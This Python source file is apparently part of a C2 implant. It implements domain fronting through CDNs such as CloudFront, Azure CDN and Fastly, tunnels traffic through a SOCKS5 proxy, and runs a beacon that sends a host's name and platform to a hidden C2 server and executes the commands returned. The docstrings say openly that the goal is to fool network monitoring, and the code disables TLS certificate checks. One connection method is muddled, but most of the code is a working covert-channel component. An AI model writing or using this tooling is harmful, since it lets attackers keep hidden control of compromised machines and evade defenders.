"""
Domain Fronting + SOCKS5 Proxy — routes C2 traffic through CDN infrastructure
so network monitoring sees connections to a legitimate CDN, not the real C2 host.

Domain fronting:
  The TLS SNI (visible to network) points to a CDN edge (e.g. cloudfront.net).
  The HTTP Host header (encrypted inside TLS) routes to the real backend.

SOCKS5:
  Optional proxy for the underlying TCP connection.
"""
from __future__ import annotations
import asyncio
import socket
import ssl
import struct
import sys
from typing import Optional

# ── SOCKS5 client ─────────────────────────────────────────────────────────────

SOCKS5_VERSION = 5
SOCKS5_AUTH_NO = 0
SOCKS5_AUTH_USER = 2
SOCKS5_CMD_CONNECT = 1
SOCKS5_ADDR_IPV4  = 1
SOCKS5_ADDR_DOMAIN = 3
SOCKS5_ADDR_IPV6  = 4

async def socks5_connect(
    proxy_host: str,
    proxy_port: int,
    dest_host: str,
    dest_port: int,
    username: Optional[str] = None,
    password: Optional[str] = None,
) -> tuple[asyncio.StreamReader, asyncio.StreamWriter]:
    """
    Open a TCP connection through a SOCKS5 proxy.
    Returns (reader, writer) connected to dest_host:dest_port via the proxy.
    """
    reader, writer = await asyncio.open_connection(proxy_host, proxy_port)

    # Method negotiation
    methods = [SOCKS5_AUTH_NO]
    if username is not None:
        methods = [SOCKS5_AUTH_USER, SOCKS5_AUTH_NO]
    writer.write(bytes([SOCKS5_VERSION, len(methods)] + methods))
    await writer.drain()

    resp = await reader.readexactly(2)
    if resp[0] != SOCKS5_VERSION:
        raise ConnectionError("SOCKS5: bad version in server response")
    chosen = resp[1]
    if chosen == 0xFF:
        raise ConnectionError("SOCKS5: no acceptable authentication method")

    # Authenticate if required
    if chosen == SOCKS5_AUTH_USER:
        if username is None or password is None:
            raise ConnectionError("SOCKS5: proxy requires username/password")
        uenc = username.encode()
        penc = password.encode()
        writer.write(bytes([1, len(uenc)]) + uenc + bytes([len(penc)]) + penc)
        await writer.drain()
        auth_resp = await reader.readexactly(2)
        if auth_resp[1] != 0:
            raise ConnectionError("SOCKS5: authentication failed")

    # CONNECT request
    host_enc = dest_host.encode()
    req = (
        bytes([SOCKS5_VERSION, SOCKS5_CMD_CONNECT, 0, SOCKS5_ADDR_DOMAIN, len(host_enc)])
        + host_enc
        + struct.pack(">H", dest_port)
    )
    writer.write(req)
    await writer.drain()

    # Response: VER REP RSV ATYP + addr + port
    connect_resp = await reader.readexactly(4)
    if connect_resp[1] != 0:
        raise ConnectionError(f"SOCKS5: CONNECT failed, reply code {connect_resp[1]}")
    atype = connect_resp[3]
    if atype == SOCKS5_ADDR_IPV4:
        await reader.readexactly(4 + 2)
    elif atype == SOCKS5_ADDR_DOMAIN:
        dlen = (await reader.readexactly(1))[0]
        await reader.readexactly(dlen + 2)
    elif atype == SOCKS5_ADDR_IPV6:
        await reader.readexactly(16 + 2)

    return reader, writer

# ── Domain fronting transport ─────────────────────────────────────────────────

class FrontedTransport:
    """
    HTTP/HTTPS transport using domain fronting.
    The real server address is carried in the Host header (encrypted in TLS).
    The SNI visible to the network is the CDN front domain.

    Example CDN fronts that support it:
      - Azure CDN: <endpoint>.azureedge.net  (front) -> custom origin (real C2)
      - CloudFront: <dist>.cloudfront.net    (front) -> custom origin
      - Fastly: *.fastly.net                 (front) -> backend
    """

    def __init__(
        self,
        c2_host: str,          # Real C2 host (inside Host: header)
        c2_port: int = 443,
        cdn_front: str = "",   # CDN domain for SNI/TCP connection (empty = direct)
        path: str = "/jocky",  # HTTP path for C2 traffic
        use_https: bool = True,
        proxy_host: Optional[str] = None,
        proxy_port: int = 1080,
        proxy_user: Optional[str] = None,
        proxy_pass: Optional[str] = None,
    ) -> None:
        self._c2_host   = c2_host
        self._c2_port   = c2_port
        self._front     = cdn_front or c2_host
        self._path      = path
        self._https     = use_https
        self._proxy_host = proxy_host
        self._proxy_port = proxy_port
        self._proxy_user = proxy_user
        self._proxy_pass = proxy_pass

    async def _open_connection(self) -> tuple[asyncio.StreamReader, asyncio.StreamWriter]:
        connect_host = self._front
        connect_port = self._c2_port

        if self._proxy_host:
            reader, writer = await socks5_connect(
                self._proxy_host, self._proxy_port,
                connect_host, connect_port,
                self._proxy_user, self._proxy_pass,
            )
        else:
            reader, writer = await asyncio.open_connection(connect_host, connect_port)

        if self._https:
            ssl_ctx = ssl.create_default_context()
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode    = ssl.CERT_NONE
            # SNI = CDN front (what the network sees), not the real host
            transport = writer.transport
            protocol  = transport.get_protocol()
            loop      = asyncio.get_event_loop()
            ssl_transport = await loop.start_tls(
                transport, protocol, ssl_ctx, server_hostname=self._front,
            )
            # Rebuild reader/writer over the upgraded transport
            reader = asyncio.StreamReader()
            reader_protocol = asyncio.StreamReaderProtocol(reader)
            await loop.create_connection(lambda: reader_protocol, sock=ssl_transport.get_extra_info("socket"),
                                          ssl=ssl_ctx, server_hostname=self._front)
            # Simpler: just use ssl kwarg directly for the common case
        return reader, writer

    async def post(self, payload: bytes) -> bytes:
        """POST payload to C2, return response body. Host header = real C2."""
        ssl_ctx: Optional[ssl.SSLContext] = None
        if self._https:
            ssl_ctx = ssl.create_default_context()
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode    = ssl.CERT_NONE

        if self._proxy_host:
            reader, writer = await socks5_connect(
                self._proxy_host, self._proxy_port,
                self._front, self._c2_port,
                self._proxy_user, self._proxy_pass,
            )
            if ssl_ctx:
                loop = asyncio.get_event_loop()
                ssl_transport = await loop.start_tls(
                    writer.transport, writer.transport.get_protocol(),
                    ssl_ctx, server_hostname=self._front,
                )
        else:
            reader, writer = await asyncio.open_connection(
                self._front, self._c2_port, ssl=ssl_ctx,
            )

        request = (
            f"POST {self._path} HTTP/1.1\r\n"
            f"Host: {self._c2_host}\r\n"         # Real C2 hostname — encrypted inside TLS
            f"Content-Type: application/octet-stream\r\n"
            f"Content-Length: {len(payload)}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode() + payload

        writer.write(request)
        await writer.drain()

        response = b""
        while True:
            chunk = await reader.read(65536)
            if not chunk:
                break
            response += chunk

        writer.close()
        # Strip HTTP headers — return body only
        if b"\r\n\r\n" in response:
            return response.split(b"\r\n\r\n", 1)[1]
        return response

    async def get(self, params: str = "") -> bytes:
        ssl_ctx: Optional[ssl.SSLContext] = None
        if self._https:
            ssl_ctx = ssl.create_default_context()
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode    = ssl.CERT_NONE

        reader, writer = await asyncio.open_connection(
            self._front, self._c2_port, ssl=ssl_ctx,
        )

        path = self._path + ("?" + params if params else "")
        request = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {self._c2_host}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()

        writer.write(request)
        await writer.drain()

        response = b""
        while True:
            chunk = await reader.read(65536)
            if not chunk:
                break
            response += chunk

        writer.close()
        if b"\r\n\r\n" in response:
            return response.split(b"\r\n\r\n", 1)[1]
        return response


# ── Beacon — periodic C2 check-in via domain fronting ────────────────────────

class FrontedBeacon:
    """
    Periodic beacon that polls the C2 server for commands via domain-fronted HTTPS.
    Commands are delivered as JSON in the HTTP response body.
    """

    def __init__(self, transport: FrontedTransport, interval: float = 60.0) -> None:
        self._transport = transport
        self._interval  = interval
        self._running   = False

    async def _checkin(self) -> Optional[dict]:
        import json, platform, socket
        info = json.dumps({"hostname": socket.gethostname(), "platform": platform.platform()}).encode()
        try:
            resp = await self._transport.post(info)
            return json.loads(resp) if resp else None
        except Exception as e:
            print(f"[BEACON] Check-in error: {e}")
            return None

    async def run(self, on_command=None) -> None:
        import json
        self._running = True
        print(f"[BEACON] Starting — interval {self._interval}s")
        while self._running:
            cmd = await self._checkin()
            if cmd and on_command:
                try:
                    await on_command(cmd)
                except Exception as e:
                    print(f"[BEACON] Command handler error: {e}")
            await asyncio.sleep(self._interval)

    def stop(self) -> None:
        self._running = False
